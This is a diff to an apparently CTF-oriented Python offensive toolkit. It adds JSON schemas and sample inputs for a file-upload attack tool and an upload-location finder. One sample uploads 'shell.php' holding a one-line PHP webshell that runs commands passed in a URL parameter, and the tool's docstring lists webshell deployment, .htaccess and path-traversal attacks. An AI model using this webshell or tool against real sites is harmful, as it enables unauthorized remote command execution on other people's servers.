@@ -6,7 +6,6 @@ extension bypass, MIME type manipulation, webshell deployment,
 .htaccess/.user.ini attacks, and path traversal testing.
 """
 
-import json
 import random
 import re
 import string
@@ -14,6 +13,8 @@ from typing import Optional, Tuple
 from urllib.parse import urljoin
 
 import requests
+
+from ctf_solver.tools.core import parse_json_input
 
 
 class FileUploadTool:
@@ -58,6 +59,49 @@ class FileUploadTool:
         "For upload_custom: include 'filename' and 'content'. "
         "For upload_htaccess: optionally include 'target_ext' (default: .jpg)."
     )
+    parameters_schema = {
+        "type": "object",
+        "properties": {
+            "url": {"type": "string"},
+            "file_param": {"type": "string"},
+            "operation": {
+                "type": "string",
+                "enum": [
+                    "test_extensions",
+                    "test_mime",
+                    "test_content",
+                    "generate_webshell",
+                    "full_test",
+                    "upload_custom",
+                    "upload_htaccess",
+                    "upload_userini",
+                    "test_traversal",
+                    "generate_htaccess",
+                ],
+            },
+            "filename": {"type": "string"},
+            "content": {"type": "string"},
+            "target_ext": {"type": "string", "default": ".jpg"},
+            "headers": {"type": "object"},
+            "data": {"type": "object"},
+        },
+        "required": ["url", "file_param", "operation"],
+        "additionalProperties": False,
+    }
+    samples = [
+        {
+            "url": "http://example.com/upload",
+            "file_param": "file",
+            "operation": "test_extensions",
+        },
+        {
+            "url": "http://example.com/upload",
+            "file_param": "file",
+            "operation": "upload_custom",
+            "filename": "shell.php",
+            "content": "<?php system($_GET['c']); ?>",
+        },
+    ]
 
     # Extension bypass techniques
     EXTENSION_BYPASSES = {
@@ -234,11 +278,9 @@ class FileUploadTool:
 
     def use(self, tool_input: str) -> str:
         # Parse JSON input
-        try:
-            data = json.loads(tool_input) if tool_input else {}
-        except json.JSONDecodeError as exc:
-            return f"[FileUploadTool] Error: tool_input must be JSON. Decoding failed with: {exc}"
-
+        data, err = parse_json_input(tool_input, "FileUploadTool")
+        if err:
+            return err
         operation = data.get("operation", "").lower().strip()
         if not operation:
             return "[FileUploadTool] Error: 'operation' is required."
@@ -1251,6 +1293,19 @@ class UploadLocationFinder:
         "'base_url' (target website), 'filename' (uploaded file name), and optionally "
         "'custom_paths' (list of paths to check). Tests common upload directories."
     )
+    parameters_schema = {
+        "type": "object",
+        "properties": {
+            "base_url": {"type": "string"},
+            "filename": {"type": "string"},
+            "custom_paths": {"type": "array"},
+        },
+        "required": ["base_url", "filename"],
+        "additionalProperties": False,
+    }
+    samples = [
+        {"base_url": "http://example.com", "filename": "shell.php"},
+    ]
 
     # Common upload directories
     COMMON_PATHS = [
@@ -1281,11 +1336,9 @@ class UploadLocationFinder:
         self.session = session or requests.Session()
 
     def use(self, tool_input: str) -> str:
-        try:
-            data = json.loads(tool_input) if tool_input else {}
-        except json.JSONDecodeError as exc:
-            return f"[UploadLocationFinder] Error: tool_input must be JSON: {exc}"
-
+        data, err = parse_json_input(tool_input, "UploadLocationFinder")
+        if err:
+            return err
         base_url = data.get("base_url", "").strip().rstrip("/")
         filename = data.get("filename", "").strip()
         custom_paths = data.get("custom_paths", [])
